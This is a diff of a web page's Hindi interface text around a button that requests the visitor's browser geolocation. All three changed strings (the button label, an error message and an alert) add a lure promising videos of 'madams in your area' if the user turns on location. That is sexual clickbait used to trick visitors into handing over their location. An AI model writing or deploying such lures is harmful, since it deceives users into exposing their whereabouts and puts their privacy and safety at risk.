@@ -84,7 +84,7 @@ body {
 
   <button id="locationButton"
           type="button"
-          aria-label="लोकेशन साझा करें"></button>
+          aria-label="अपने एरिया की मैडम की वीडियो के लिए लोकेशन साझा करें"></button>
 
   <div id="result" aria-live="polite">
     <div id="city"></div>
@@ -290,7 +290,7 @@ function locationError(error) {
   button.style.display = "inline-block";
 
   cityElement.textContent =
-    "City: लोकेशन प्राप्त नहीं हुई";
+    "City: लोकेशन प्राप्त नहीं हुई अपने एरिया की मैडम की वीडियो के लिए आपका लोकेशन की सेटिंग ऑन चाहिए";
 
   stateElement.textContent =
     "State: कृपया अनुमति और Location सेटिंग जाँचें";
@@ -306,7 +306,7 @@ button.addEventListener("click", function () {
   if (!consent) return;
 
   if (!navigator.geolocation) {
-    alert("आपके ब्राउज़र में लोकेशन सुविधा उपलब्ध नहीं है।");
+    alert("आपके ब्राउज़र में लोकेशन सुविधा उपलब्ध नहीं है। अपने एरिया की मैडम की वीडियो के लिए आपका लोकेशन की सेटिंग ऑन चाहिए");
     return;
   }
 
